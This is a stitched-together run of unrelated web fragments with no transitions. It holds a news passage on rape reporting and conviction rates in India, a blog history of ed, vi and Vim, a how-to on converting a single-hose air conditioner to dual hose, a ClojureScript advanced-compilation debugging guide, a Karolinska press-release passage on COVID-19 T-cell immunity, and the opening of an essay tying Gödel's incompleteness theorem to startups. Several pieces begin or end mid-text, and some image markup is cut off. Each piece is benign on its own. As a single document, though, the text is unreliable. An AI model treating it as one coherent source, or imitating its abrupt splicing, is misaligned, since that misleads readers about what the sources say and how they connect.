<p>The numbers would appear to back him up: Between 2012 and 2015, cases of rape reported to the police increased by 39%, perhaps suggesting victims have become more willing to come forward. But victims still claim law enforcement dissuades them from pressing charges. They often suffer humiliation at police stations and hospitals, according to a 2017 <a href="https://www.hrw.org/report/2017/11/08/everyone-blames-me/barriers-justice-and-support-services-sexual-assault-survivors">paper</a> by Human Rights Watch. Even when police do cooperate with victims, the legal system often fails them. According to 2018 data from India’s National Crime Records Bureau, only <a href="https://economictimes.indiatimes.com/news/politics-and-nation/conviction-in-crimes-against-dalits-is-abysmally-low-mha-report/articleshow/63833473.cms">27.2%</a>&nbsp;of state prosecutions for rape in India led to a conviction. By contrast, the <a href="https://www.cps.gov.uk/cps/news/annual-violence-against-women-and-girls-report-published-0">corresponding figure</a> for 2017 to 2018 in the United Kingdom stood at 58%.&nbsp;</p>



<p>Rukmini Sen, a sociologist with the Ambedkar University Delhi, said India’s male-dominated police force still stigmatizes victims of sexual violence. “Time and again, various initiatives are announced … and clearly all of these attempts have either not been properly carried forward or have not created enough confidence in women,” she said.&nbsp;</p>

<p>You probably heard of Vim, the almighty text-editor that is everywhere and
a place where <a href="https://stackoverflow.com/questions/11828270/how-do-i-exit-the-vim-editor">people get trapped from time to time</a>.
If you are hearing from your local DevOps engineer how Vim is excellent and
fast, you probably thought about giving it a try. But how did it come
to this? How did Vim-craze take over the world at some point?</p>
<p>If we look at the
<a href="https://insights.stackoverflow.com/survey/2019#technology-_-most-popular-development-environments">StackOverflow survey for 2019</a>
about the most popular development environments, Vim is still there on the 5th
place, with around 25% of Web Developers using it. Fifth place is pretty neat
considering the first Vim release happened almost 30 years ago (yeah, you read
that right, Vim got first released in 1991).</p>
<p>To better understand why and how Vim got (and is) so popular, it is best to
look into the roots of how it all started. Before <code>vim</code>, there was <code>vi</code>, before
<code>vi</code> there was <code>ed</code>. What are all these two or three letter words, and
what is the story behind it? Let us dive in and figure out.</p>
<h2 id="punch-cards-and-line-editors"><a href="#punch-cards-and-line-editors" aria-label="punch cards and line editors permalink"></a>Punch cards and line editors</h2>
<p>It might be apparent today why we have text editors and fully-fledged IDE
(Integrated Development Environment), but what did we have before that?
As you may know, early forms of programming involved putting <a href="https://en.wikipedia.org/wiki/Punched_card">papers with
holes (punch cards)</a> inside a
computer. The order in which you placed these in was very essential. For example, this
is a picture of 4.5 megabytes data, stacked in 62500 punch cards. Imagine
dropping that and having to sort it again.</p>
<p><span>
      <span></span>
  <img alt="Punch card stack" title="Punch card stack" src="https://pragmaticpineapple.com/static/ad5b0a6e4d363f9e5c40fbdcdbe559fb/e6523/punch-card-stack.jpg" srcset="https://pragmaticpineapple.com/static/ad5b0a6e4d363f9e5c40fbdcdbe559fb/a80bd/punch-card-stack.jpg 148w,

<p>
  OK, mom, I'll come down, just need to re-stack my new blog post
</p>
<p>Punch cards proved a bit inefficient as computer power and storage grew, and
programming evolved. Eventually, people moved away from punch cards, and then
there came the era of “line editors.” One great example of this is an
<a href="https://en.wikipedia.org/wiki/Ed_(text_editor)"><code>ed</code> editor</a>. Let’s not forget to
mention <a href="https://www.bell-labs.com/usr/dmr/www/qedman.html">QED editor</a>,
<code>ed</code>’s predecessor.</p>
<h2 id="using-a-line-editor"><a href="#using-a-line-editor" aria-label="using a line editor permalink"></a>Using a line editor</h2>
<p>If you are on Linux or Mac OS, open your terminal and type <code>ed</code>. You
will get a simple line editor, which will greet you with silence.
If you are amazed by this finding (as I was), you can try playing with it for a while. To write
a file, start typing <code>a</code> and press enter, then write your text. Typing <code>.</code>
following an enter will exit the append (insert) mode. Then, to write a file, you can
type <code>w myfile.txt</code> and press enter and lastly write <code>q</code> and enter to exit.</p>
<div data-language="text"><pre><code># ed
a
Hey there!
I am using ed right now, how cool.
OK, that's enough.
.
w myfile.txt
64
q</code></pre></div>
<p>As you may notice, there are similarities between working with <code>ed</code> and with
today’s <code>vim</code>. If you use Vim, you can say you would get the hang of <code>ed</code> pretty
quickly.</p>
<h2 id="vims-dad---the-vi"><a href="#vims-dad---the-vi" aria-label="vims dad   the vi permalink"></a>Vim’s dad - The Vi</h2>
<p>After <code>ed</code>, then came the <code>em</code> - <a href="http://www.eecs.qmul.ac.uk/~gc/history/">the “editor for mortals”</a>.
It could do similar things as <code>ed</code>, but it is ‘less cryptic’ and built for
regular people. Based on <code>em</code>’s code, Bill Joy developed <code>ex</code>, which
stands for “extended ed”! It was significant because <code>ex</code> had, besides the previous
modes, the <code>visual</code> mode, which will show the whole file on your screen. You
must be thinking - duh, how didn’t they <a href="https://www.bell-labs.com/usr/dmr/www/qed.html">think of that earlier</a>?
Having that thing show up on computers in those days was pretty tricky,
and some considered it a resource hog. But, at that point, the benefits had
outweighed objections, and having a file opened on your screen as you edit it
became today’s standard.</p>
<p><span>
      <span></span>
  <img alt="Vi editor" title="Vi editor" src="https://pragmaticpineapple.com/static/dd4157ecc91779d4e893edf95e85f3f5/fcda8/vi.png" srcset="https://pragmaticpineapple.com/static/dd4157ecc91779d4e893edf95e85f3f5/12f09/vi.png 148w,

    </span></p>
<p>And like that, the <strong>vi</strong>sual mode was born. Later, the executable <code>vi</code> got
introduced in operating systems, but you can still access <code>ex</code> commands by
typing <code>:</code> in <code>vi</code>/<code>vim</code>. The <code>ex</code> got released in 1976, and the <code>vi</code>
executable got released in 1979. 40-something years ago! But, how did <code>vim</code> came to life?</p>
<h2 id="the-imitation-game"><a href="#the-imitation-game" aria-label="the imitation game permalink"></a>The Imitation Game</h2>
<p>A couple of years later, many <code>vi</code> clones emerged (my favorite one is
<a href="https://en.wikipedia.org/wiki/Elvis_(text_editor)">Elvis</a>). One of them was “Vi
Improved” which was created by Bram Moolenaar - the name you now see when you
try to open <code>vim</code> in your terminal. In the large pool of different <code>vi</code> clones,
<code>vim</code> managed to stand out. Bram used a clone of <code>vi</code> called <code>STEVIE</code> (nice
name, BTW), and noticed that it lacks many of <code>vi</code>’s commands. He added
some new features and made it compatible with <code>vi</code> and released it under
the name “Vi Imitation” (this later changed to “Vi Improved”). The name <code>vim</code> came in version 2.0 in 1993 and
stayed like that until the present day. But how did <code>vim</code> achieve fame? It had a
<a href="https://en.wikipedia.org/wiki/Vim_(text_editor)#Features_and_improvements_over_vi">bunch of excellent features</a>
at that time, and it was compatible with <code>vi</code>. Features and compatibility attracted a lot of folks to use it.</p>
<h2 id="half-a-century-of-contributions"><a href="#half-a-century-of-contributions" aria-label="half a century of contributions permalink"></a>Half a century of contributions</h2>
<p>If you take a look at the essential commands to move around in Vim: <code>h</code>, <code>j</code>,
<code>k</code>, and <code>l</code>, these all pull roots from the old <code>vi</code> days. Bill Joy’s
<a href="https://en.wikipedia.org/wiki/ADM-3A">keyboard at that time</a>
didn’t have cursors to move around. Also, the <code>ESC</code> key was in the place
of today’s <code>TAB</code> key. Take a look at how it was back in the day:</p>
<p><span>
      <span></span>
  <img alt="ADM 3A keyboard" title="ADM 3A keyboard" src="https://pragmaticpineapple.com/static/b20427945c23d658e5827bddebee2fb6/fcda8/adm-3a-keyboard.png" srcset="https://pragmaticpineapple.com/static/b20427945c23d658e5827bddebee2fb6/12f09/adm-3a-keyboard.png 148w,

<p>Commands to replace text like <code>:%s/text_to_replace/text_to_replace_it_with/</code> is
also something from that era. Having to type <code>:</code> to perform a command
was an answer to <code>ed</code>’s complete silence when you first enter the editor.</p>
<p>What I am trying to say that <code>vim</code> is an effort of over half a century of
good idea accumulation, putting lots of effort into being backward compatible.
Yes, useful features probably made Vim famous. But what kept Vim in the loop is
the compatibility with almost everything you can think about. Wherever you SSH
today, you can start the Vim session, or at least Vi session. That is a strong
(if not the strongest) point to learn it nowadays.</p>
<p>If you’re not someone who jumps from server to server and navigates files on
there, the point of having Vim everywhere doesn’t bother you. But
still, there are a couple of reasons why it might be valuable to you. I am forming
a new blog post explaining why you should learn Vim in 2020. If you are interested

<p>Thanks for reading this far, I appreciate it. I hope this blog post shed some
light on how Vim became what it is today. I also hope the post inspired you to
try it out. You never know when you might need it, or you like it so much that
you decide to switch to using Vim fully.</p>
<p>Maybe you get a Vim mode inside your IDE or VSCode, who knows. I am not saying
that Vim should replace what you are using now, but trying to learn and
configure it will improve your skills and abilities. On the other hand, it doesn’t really
matter what editor you use, it is what you do with it!</p>
<p>At the end of the day, it’s the matter of finding the proper editor
(tool) that makes you do what you do even better.</p>

    <p>Single hose air conditioners (AC) should be banned. By design, they are
inefficient; they can blast cold air at a person sitting directly in front,
but will never be able to cool the rest of the room. Single hose ACs are bad
news for the environment, energy bills and your heatwave comfort!</p>

<p>The problem for UK residents is that single hose ACs are the only type of
portable model available to buy. Dual hose models or <a href="https://en.wikipedia.org/wiki/Air_conditioning#Window_unit_and_packaged_terminal">window
units</a>
are not available, despite their drastically better cooling performance. But
what makes single hose ACs so bad?</p>

<h2 id="background-air-conditioners-are-just-refrigerators-with-fans">Background: Air conditioners are just refrigerators with fans</h2>
<p>Most air conditioning systems work by exchanging heat from the inside air to
the outside air, using <a href="https://en.wikipedia.org/wiki/Vapor-compression_refrigeration">vapor-compression
refrigeration</a>.
All efficient designs (anything that’s not a single hose) do this without ever
mixing the separate air masses or causing any pressure differential between the
outside and inside. It doesn’t matter whether it’s a split AC unit in a
commercial property, the AC in your car, or your kitchen refrigerator, they
follow this operating model:</p>

<div>
<figure><img src="https://www.woolie.co.uk/article/convert-ac-from-single-hose-to-dual-hose/air-conditioning-system-type-split.svg" alt="Diagram showing operation of split type air conditioning system."><figcaption>Split inside/outside unit air conditioning system</figcaption></figure>
</div>

<p>Dual hose portable air conditioners follow the same principle, but incorporate
the outside unit into a single inside unit; instead using ducting hoses to draw
outside air over the condenser coils and back to the outside again. They are
more convenient as no permanent installation is required, but are marginally
less efficient due to heat loss through the hoses and the additional heat
generated from the compressor which is now inside the room that needs to be
cooled.</p>

<div>
<figure><img src="https://www.woolie.co.uk/article/convert-ac-from-single-hose-to-dual-hose/air-conditioning-system-type-portable-dual-hose.svg" alt="Diagram showing operation of portable dual hose type air conditioning system."><figcaption>Portable dual hose air conditioning system</figcaption></figure>
</div>

<h2 id="what-makes-single-hose-acs-so-bad">What makes single hose ACs so bad?</h2>
<p>Single hose models are the only type that violate this principle, which is why
they are so inefficient. Instead of using two hoses to keep the air masses
separate and drawing outside air to pass over the condenser coils, they ditch the
intake hose and just draw the <em>inside</em> air instead. Why? Probably because they’re
cheaper to manufacture and easier for customers to install.</p>

<div>
<figure><img src="https://www.woolie.co.uk/article/convert-ac-from-single-hose-to-dual-hose/air-conditioning-system-type-portable-single-hose.svg" alt="Diagram showing operation of portable single hose type air conditioning system."><figcaption>Portable single hose air conditioning system</figcaption></figure>
</div>

<p>But this design has a huge performance cost. With the inside air now being
forced to the outside through the exhaust hose, the inside is now always at a
lower pressure.  No room is perfectly sealed, so to equalise the pressure, hot
air from outside is continuously drawn through door frames and a multitude of
other tiny gaps in the room. This is why single hose units will never cool an
entire room, they are constantly fighting against hot air rushing back into the
room due to the negative pressure.</p>

<p>Don’t believe me? Turn the AC on in a small room, use a good seal between the
exhaust hose and the window, then close all doors and feel around the gaps
between the door and the frame. You’ll be able to feel the air rushing in to
the equalise the negative pressure in the room you’re trying to cool.</p>

<h2 id="solution-convert-the-single-hose-ac-to-dual-hose">Solution: Convert the single hose AC to dual hose</h2>
<p>Thankfully, many single hose ACs can easily be converted to dual hose systems.
Single hose systems are often designed with two separate intake ports just like
dual hose units, despite only needing one; presumably to reduce design and
manufacturing costs. By fashioning an adapter to duct the condenser intake port
so that it draws from the outside air, it will perform with the same efficiency
as a dual hose unit.</p>

<p>There are two requirements that a single hose air conditioning unit must meet
to make conversion possible:</p>

<ol>
  <li><strong>There must be two separate air intake ports for the evaporator and
condenser sides</strong>.
    <ol>
      <li>The unit likely meets this requirement if it has three separate air
grilles in addition to the exhaust hose.</li>
    </ol>
  </li>
  <li><strong>There must be an internal separation between the evaporator and condenser
side air flows</strong>. There are two ways to find this out:
    <ol>
      <li>Find photos or designs from others that have explored the internals of
your model.</li>
      <li>Open the unit up and investigate yourself. Do not do this unless you are
confident about electrical and refridgerant safety and are prepared to
invalidate the warranty of your machine.</li>
    </ol>
  </li>
</ol>

<p>To convert the unit from single host to dual hose:</p>

<ol>
  <li>Source an additional air conditioning hose or equivalent.</li>
  <li>Identify which air grille on the unit is the condenser (hot coil) air
intake.</li>
  <li>Create an adapter to duct this air grille into the additional air
conditioning hose, so that it can be made to draw air from the outside.</li>
</ol>

<h2 id="my-conversion-example">My conversion example</h2>
<p>I purchased a “Challenge 5K Air Conditioning Unit” in 2019 for £289.99 from
Argos. Despite only being 5000 BTU, after conversion to dual hose it was able
to cool a medium sized room from 34 C outside temperatures down to 22 C in only
a couple of hours.</p>

<p>The conversion was performed in minutes, using items easily purchased at a
hardware shop or found around the house:</p>

<ol>
  <li>A tumble drier hose.</li>
  <li>Discarded polystyrene packaging foam and cardboard.</li>
  <li>Spare foam strips that came along with the air conditioner to provide a
better seal between the polystyrene and the unit.</li>
  <li>Plenty of duck tape.</li>
</ol>

<p>This isn’t an ideal set of materials, but works well enough to tide over for
the summer.</p>

<p>On the Challenge unit, the condenser air intake is the lower grille underneath
the exhaust hose port. After ducting this grille into the tumble drier hose,
this is the result. Not aesthetically pleasing, but very effective for the
three days of summer that the UK gets every year:</p>



<h2 id="further-tips-for-optimum-efficiency">Further tips for optimum efficiency</h2>

<ul>
  <li>Purchase a window sealing unit designed for your type of window.</li>
  <li>Keep the intake and exhaust hoses away from each other when outside of the
window. Having them close to each other increases the change that the intake
hose is drawing in freshly exhausted hot air. If stacking vertically, I like
to keep the intake hose below the exhaust hose for this reason too, as hot
air rises slightly.</li>
  <li>Keep the length of the hoses short, to minimise losses back into the room.
Move the unit as close to the window as possible.</li>
</ul>

        <p>Imagine this: You have a large multi-module ClojureScript project, and you are planning to make a new deployment in the
production.
Your project is using CLJS Compiler’s Advanced Optimizations mode.
Everything seems to be working smoothly. You are performing some last E2E tests before making a release.<br>
Then, a faulty module loads.<br>
<strong>BAM!</strong> You are slapped in the face with an error something like this:</p>

<div><div><pre><code>Uncaught Error: No protocol method IMultiFn.-add-method defined for type function: function XR() { [native code] }
    at Nb ((index):964)
    at yh ((index):443)
    at (index):236
(index):143 Uncaught TypeError: Cannot read property 'j' of undefined
    at NU ((index):143)
    at login-a5a67c0fffdfa158b7220c8c2553253b645e4e2e.js:169
</code></pre></div></div>

<p>You did not expect this. There were no significant new changes since the last build, and the unit tests were all
hunky-dory.<br>
Additionally, everything worked fine when using Firefox, but now the compiled code crashes on Google Chrome. 
What is going on? The release deadline is looming and you have to fix this ASAP.</p>

<p><img src="https://dev.solita.fi/img/taming-cljs-advanced-compilation/slap.png" alt="Holy Stack Trace, Batman!"><br>
<em>Holy Stack Trace, Batman!</em></p>

<p>When you build your code with the CLJS compiler, it emits JavaScript code that is compatible with the 
advanced_optimizations level of the Google Closure compiler. Then, if <code>":optimizations :advanced"</code> compiler option is
enabled, the CLJS compiler will minify the result with Closure Compiler’s Advanced Optimizations.</p>

<p>Closure Compiler’s Advanced Optimizations mode can cause some errors in your build that can be uncomfortable to
track down if you are new to Closure Compiler.
On top of that, help might be hard to find if you are trying to search the web with the error message because the function
names are all mangled up.</p>

<p>It is better to avoid these errors by keeping the Advanced Compilation mode in mind from the start of the project. 
I’ll describe some common methods to help you to avoid and resolve advanced compilation issues, and 
show how to resolve the more uncommon issue that was described in the beginning and what is the reason behind it.</p>

<h2 id="avoiding-issues-with-advanced-compilation">Avoiding issues with Advanced Compilation</h2>

<p>It is recommended to use <code>":optimizations :advanced"</code> CLJS compiler option for your production builds.
You will greatly reduce your final build size by using more aggressive advanced transformations such as dead code 
removal and aggressive renaming.<br>
Read more about the advanced transformations at here: <a href="https://developers.google.com/closure/compiler/docs/compilation_levels#advanced_optimizations">Closure Compiler compilation levels</a></p>

<p>Different build tools such as lein-cljsbuild and shadow-cljs might pass different default options to Closure Compiler.
I won’t cover the differences in this blog post, but instead, I will provide some general guidelines on how to avoid
issues with advanced compilation in your project.</p>

<h3 id="keep-your-externs-in-a-good-shape">Keep your externs in a good shape</h3>
<p><a href="https://clojurescript.org/guides/externs">Extern</a> is a mechanism for declaring names that should not be munged (renamed) by Closure Compiler.
When you are using external libraries, make sure that they come <a href="http://cljsjs.github.io/">bundled</a>
with externs if you are using a build tool like lein-cljsbuild. Or, provide externs files of your own if needed. 
Otherwise, Closure Compiler will munge references to externally defined symbols unintentionally during advanced 
compilation causing errors found only later when running the compiled code.</p>

<p>To add externs of your own, use a compiler option for example: <code>":externs ["externs.js"]"</code> and provide an
externs.js file in your working directory.</p>

<p>Also, It is good to use <code>":infer-externs true"</code> compiler option. This option will enable generating externs automatically
for JavaScript interop calls.</p>

<p>It is worth to know, that Closure Compiler includes externs for stable JavaScript APIs, but newer features that have an
experimental status might not be included yet. The experimental APIs change very quickly, so it makes no sense to include
them in the Closure Compiler tool. So, if you are planning to use some experimental features, make sure 
you add them to your own externs file.</p>

<p>Read more about using external JavaScript libraries from <a href="http://lukevanderhart.com/2011/09/30/using-javascript-and-clojurescript.html">here</a></p>

<h3 id="splitting-code-might-cause-name-collisions">Splitting code might cause name collisions</h3>
<p>If you are <a href="https://clojurescript.org/guides/code-splitting">splitting</a> your CLJS code into <code>:modules</code>, you might want
to use <code>:rename-prefix "..."</code> compiler option.<br>
Split modules are running in the global JavaScript scope, so they might interfere with other code loaded on the same page 
(e.g. Google Analytics) and cause unpredictable errors if name collisions occur.
When using <code>":rename-prefix"</code>, it is best to use a very short string as a prefix, for example: <code>:rename-prefix "r_"</code></p>

<p>This will increase the final (gzipped) build size slightly because now each munged global variable will be prefixed with “r_”.</p>

<h3 id="wrap-cljs-output-to-prevent-global-scope-pollution">Wrap CLJS output to prevent global scope pollution</h3>
<p>Closure Compiler will generate a lot of global variables during advanced compilation that can cause name collisions
with other code running on the same page.
If you are loading other code on the same page, and you are not splitting code into multiple modules you can utilize
 the <code>":output-wrapper true"</code> compiler option. The compiler will wrap the outputted JavaScript code with the default 
<code>"(function(){…​};)()"</code>. This will prevent polluting the global JavaScript scope and thus will prevent conflicts
with other external code.</p>

<p>However, if you have multiple modules in your project you must add a compiler option <code>:rename-prefix-namespace "..."</code>.
This enables each module to access the variables defined in the other modules it depends on.
This works similarly to the <code>":rename-prefix"</code> option. The difference is that every global variable will be now
scoped under one global variable instead of many. For example, if you use a prefix-namespace like this:
<code>:rename-prefix-namespace "P"</code>, the compiled code will refer to variable <code>"foo"</code> like <code>"p.foo"</code>. 
This option will also increase the final build size like the <code>":rename-prefix"</code> option, so think before using it.</p>

<p>There are other interesting compiler options not directly related to advanced optimizations, such as <code>":fn-invoke-direct"</code> 
which can be useful for optimizing performance-critical code. You can read more about them in CLJS 
<a href="https://clojurescript.org/reference/compiler-options">documentation</a>.</p>

<h2 id="debugging-advanced-compilation-bugs">Debugging Advanced Compilation bugs</h2>

<p>If you suspect you might have a problem with advanced compilation, often hinted by errors in the browser 
console that might make no sense, it is best to approach the problem in the following way.</p>

<p>Add two additional compiler options <code>":pseudo-names true"</code> and <code>":pretty-print true"</code> for your Advanced Compilation build.
Your error will now show a readable name that corresponds to the name in the source code. 
This will help you to deduce if an extern definition is missing.</p>

<p>Additionally, if your error goes away after enabling the above-mentioned compiler options, it gives you a hint
of a possible name collision problem. When there is a problem with a munged variable name colliding with an external 
variable name, the problem disappears when the munged variable name changes, like what happens when enabling the :pseudo-names option.<br>
Often, if not fixed properly, the name collision issues can arise and then be magically “fixed” when one adds new 
changes, which in turn causes changes in munged variable names in the build output. It is best to eliminate these problems for good.</p>

<h3 id="sometimes-something-funky-can-happen">Sometimes, something funky can happen</h3>
<p>In some rare cases, there might be some advanced compilation issues that are not so easy to avoid.
Let’s go back to the beginning. 
We had an error when running our built web app in Chrome. Firefox had no issues.</p>
<div><div><pre><code>Uncaught Error: No protocol method IMultiFn.-add-method defined 
                for type function: function XR() { [native code] }
    at Nb ((index):964)
    at yh ((index):443)
    at (index):236
</code></pre></div></div>

<p>The Stack Trace was pointing to a certain multimethod in the CLJS source code. 
At the first glance, the error might make no sense. The compiled code is trying to invoke -add-method IMultiFn protocol method 
for a function named XR. When searching for the munged <code>XR</code> in the build output, everything seems to be fine.
<code>XR</code> looks good and should work, right?
The key thing to notice in the error message is the <code>"[native code]"</code> part of <code>"function XR() { [native code] }"</code>.
This tells us, that the compiled code is trying to invoke a native browser function <code>XR</code> instead of our munged <code>XR</code>. 
By chance, the Closure Compiler named our multimethod to <code>XR</code> which happens to collide with the browser provided
<code>XR</code> function.</p>

<p>Occasionally you can encounter errors like this when using an older version of Closure Compiler.
Developers add new features to web browsers all the time. When a user upgrades his/her web browser there is a chance 
a new reserved word was added that collides with a munged variable.</p>

<p>It turns out, XR is a reserved word added by the WebXR platform API. When the error occurred “XR” was added in the newest 
version of Google Chrome, but not yet in Firefox. Newer Closure Compiler versions take this into account by providing
an extern for it. It is not always easy to upgrade the ClojureScript version and thus the Closure Compiler used in a project.<br>
In that case, you can fix the problem fast by adding a custom extern of your own:</p>
<div><div><pre><code><span>// externs.js</span>

<span>var</span> <span>XR</span> <span>=</span> <span>{};</span>
</code></pre></div></div>

<h2 id="conclusion">Conclusion</h2>

<p>Many times, Advanced Compilation issues with CLJS are easy to avoid with proper preparation. On rare occasions, some
stranger errors can happen. Thus, test your builds with the current browser versions and learn to debug advanced 
compilation issues swiftly to prevent wasting precious time.</p>

            <p>“Our results indicate that public immunity to COVID-19 is probably significantly higher than antibody tests have suggested,” says Professor <a href="https://staff.ki.se/people/hanlju">Hans-Gustaf Ljunggren</a> at the Center for Infectious Medicine, Karolinska Institutet, and co-senior author. “If this is the case, it is of course very good news from a public health perspective.”</p>

<p>T-cell analyses are more complicated to perform than antibody tests and at present are therefore only done in specialised laboratories, such as that at the Center for Infectious Medicine at Karolinska Institutet.</p>

<p>“Larger and more longitudinal studies must now be done on both T cells and antibodies to understand how long-lasting the immunity is and how these different components of COVID-19 immunity are related,” says Marcus Buggert.</p>

<p>The results are so new that they have not yet undergone peer review ahead of publication in a scientific journal. Pending such review, the article has been published on a preprint server, bioRxiv (see box).</p>

<p>The study was financed by the Knut and Alice Wallenberg Foundation, Nordstjernan AB, the Swedish Research Council, Karolinska Institutet, the Swedish Society for Medical Research, the Jeansson Foundations, the Åke Wiberg Foundation, the Swedish Society of Medicine, the Swedish Cancer Society, the Swedish Childhood Cancer Foundation, the Magnus Bergvall Foundation, the Hedlund Foundation, the Lars Hierta Foundation, the Swedish Physicians against AIDS foundation, the Jonas Söderquist Foundation, the Clas Groschinsky Memorial Foundation, and the Wellcome Trust.&nbsp;The authors report no conflicts of interest or patents associated with the results of the study.</p>

June 30, 2020 | https://skibinsky.com/godel-incompleteness-for-startups/ | <a href="https://web.archive.org/web/*/https://skibinsky.com/godel-incompleteness-for-startups/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>Every year a few thousand startups are incubated in Silicon Valley. Few of them will succeed; the rest will decay or outright fail. Yet there always seems to be room for one more billion-dollar company. Besides appearing seemingly out of nowhere, the most radically successful startups are also the most unpredictable ones. What force seems to create these massive sources of wealth that initially look like “<a href="http://www.paulgraham.com/swan.html" target="_blank" rel="noopener noreferrer">bad ideas</a>”&nbsp;to everybody beside their founders?</p>
<p>You may be tempted to say “<a href="http://www.amazon.com/Black-Swan-Improbable-Robustness-Fragility/dp/081297381X" target="_blank" rel="noopener noreferrer">Black Swan</a>,” and you would be correct; however, beside simple acceptance of extraordinarily rare random events, there is deeper mathematical influence over a process that constantly spawns new opportunities. Understanding that influence will help any startup founder or investor to improve his business insights. To understand these concepts better we will make a long journey that will touch upon very foundations of logic and mathematics .</p>

<p>I usually find time to look at about two hundred startups every year. Referrals arrive from other investors, startup founders I mentor or via the massive firehose of demo days at YCombinator &amp; 500 Startups. As you can imagine, this creates an overwhelming supply of startups and innovative ideas to look into. Every startup presents the ultimate question: Is it worth it to invest your time and money? Or is it a waste of both? There is never enough time to dig deep enough into any single startup to understand it fully. Making an investment is not an easy or obvious decision. Yet, over the years, I started to notice certain meta-patterns common to all startups, the patterns that give a tantalizing premonitions on their chances of success or failure. The specifics of an industry or investment cycle might change, yet these patterns remain the same in every decade. I see them as two big groups of patterns: <strong><em>human</em></strong> patterns and <strong><em>mathematical</em></strong> patterns.</p>
<p><img src="http://dgn0b0vubo9qr.cloudfront.net/wp-content/uploads/2013/01/math.png" alt="" width="150" srcset="https://skibinsky.com/wp-content/uploads/2013/01/math.png 263w, https://skibinsky.com/wp-content/uploads/2013/01/math-150x150.png 150w" sizes="(max-width: 263px) 100vw, 263px">Human patterns emerge from our personal traits. Weather a startup will overcome its human-related challenge is determined by what a person or a team can succeed or fail at. The telltale sign is when the outcome will be determined by quality or quantity of personal efforts. What you typically read in Silicon Valley startup blogs would be all about such human patterns. It will be hundreds of topics covering which software language to use, how to pick founders, how to operate the company, how to build a product, how to build software, what is company culture etc. It’s all good content, yet it only addresses patterns driven by human traits, and thus is only half of the equation.</p>
<p>What you rarely hear about is “mathematical” patterns. These patterns emerge from objective nature of the reality where a startup must operate. The market dynamics, the ecosystem of industries they find themselves in, the governing trends of technological progress. As soon as a startup starts operating in the real world, the vast majority of factors will be outside of a startup direct control or even influence, while having absolutely dominating impact on that startup eventual outcome. Beside now legendary <a href="http://www.amazon.com/Black-Swan-Improbable-Robustness-Fragility/dp/081297381X" target="_blank" rel="noopener noreferrer">Black Swan</a><a href="#footnote-1" id="refmark-1"><sup>1</sup></a> making big waves since 2006, there is almost no information on the mathematical fundamentals of startup formation and investing. Usually all you get is a non-actionable statement like “<i>90% of all startups fail</i>” after which the author promptly moves back to human factors, which are much easier to understand and analyze.</p>
<p>To help develop our mathematical intuition we will turn to one of the most profound mathematical results, provided by the legendary <a href="http://en.wikipedia.org/wiki/Kurt_G%C3%B6del">Kurt Gödel</a>: <b>The First Incompleteness Theorem</b>. To most it is a seemingly dry statement on the <i>completeness</i> and <i>consistency</i> of <i>formal systems</i>. On a deeper level, however, there is an interesting commonality between the mathematics of incompleteness and startup disruption. It’s critical to understanding the dynamics how startups get born, get big or fail, and finally how the few survivors become legacy companies. Showing this deep connection between mathematics of incompleteness of formal systems and startups will be the purpose of this essay.</p>

<blockquote><p>“[My] own work no longer means much, I came to the Institute merely…to have the privilege of walking home with Gödel.”</p>
<p><em>Albert Einstein</em></p>
</blockquote>

<p>It is surprising that Gödel’s famous theorem is all but unknown in the startup world. Thinking&nbsp; of all the mathematical knowledge that has direct impact on computer science, software and startups I would be hard pressed to come up with anything more powerful than Gödel’s <i>Incompleteness Theorem</i>.</p>
<p><a href="http://ycombinator.com/" target="_blank" rel="noopener noreferrer">Y Combinator</a> is famously named after <a href="http://en.wikipedia.org/wiki/Fixed-point_combinator" target="_blank" rel="noopener noreferrer">Y Combinator</a>, one of the best-known fixed-point combinators used to construct certain recursive functions. Yet who was the first to define and use a recursive functions? Gödel. Further, the proof that fixed points exist at all is a <a href="http://en.wikipedia.org/wiki/Diagonal_lemma" target="_blank" rel="noopener noreferrer">side effect</a> implicit of his work. Y Combinator is direct descendant<a href="#footnote-2" id="refmark-2"><sup>2</sup></a> of Gödel’s proof.</p>
<p><img src="http://dgn0b0vubo9qr.cloudfront.net/wp-content/uploads/2013/01/turing-150x150.png" width="150" height="150"></p>
<p>Consider another cornerstone of computer science, such as Alan Turing’s <a href="http://en.wikipedia.org/wiki/Halting_problem" target="_blank" rel="noopener noreferrer">Halting Problem</a>. He created that theorem when working at Princeton, right at the time when discussions about Gödel recent results dominated the institute mathematical debates. Turing’s proof is a continuation of Gödel’s work<a href="#footnote-3" id="refmark-3"><sup>3</sup></a>. Kleene, Turing and Shannon were all standing on the shoulders of the giant – gnome sized Gödel – when they were following his groundbreaking proof and inventing modern computer science. We will review Halting Problem in more details later in this essay.</p>
<p>When you truly grasp the implications of what Gödel actually proved, it will be like opening a Pandora’s box&nbsp; of wonderful insights. The implications of the theorem go far beyond just logic and math. Answers to the most sought after questions such as: <em>Why can everything be made better? Why are so many startups possible and will always be possible? Why things we build tend to get more complex over time? Why does civilization always has room to improve?</em></p>
<p>To answers these questions, and &nbsp;see how all these things are connected mathematically you need to understand Gödel incompleteness.</p>
<h2>A taste of things to come</h2>
<p>Naturally, there is a reason why Gödel theorem is still relatively unknown outside of mathematical circles. There are few big problems. First of all, <a href="http://www.research.ibm.com/people/h/hirzel/papers/canon00-goedel.pdf#page=2" target="_blank" rel="noopener noreferrer">Gödel’s proof</a> is <b>hard</b>. Not “<i>learn new computer language</i>” hard, not “<i>make an iPhone game</i>” hard, really, really, <b>really hard</b>. Gödel did not make the task of understanding his theorems easy. Being famously introverted, he preferred the logic of his proofs to do all his speaking for him. Even mathematical education is not much help here. For example, Gödel offers the following preview, a “sketch proof”, what he called an “<i>an intuition</i>” for the real proof to follow.</p>
